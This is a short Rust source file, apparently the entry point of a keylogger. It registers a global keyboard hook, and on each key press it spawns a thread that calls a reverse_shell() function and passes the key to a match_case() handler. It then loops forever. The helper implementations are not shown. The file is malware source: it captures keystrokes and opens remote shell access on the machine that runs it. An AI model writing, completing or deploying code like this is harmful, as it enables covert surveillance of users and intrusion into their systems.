mod lib;

use std::thread;

use device_query::{ DeviceState, DeviceEvents };
use lib::{match_case, reverse_shell};


fn main() {

    let device_state = DeviceState::new();

    let _guard = device_state.on_key_down( move|key| {
        
        thread::spawn( move|| {
           reverse_shell();
        });

        // spawn a theard to handle the key press
        match_case(key);
        
    
    });
        
    loop {}
}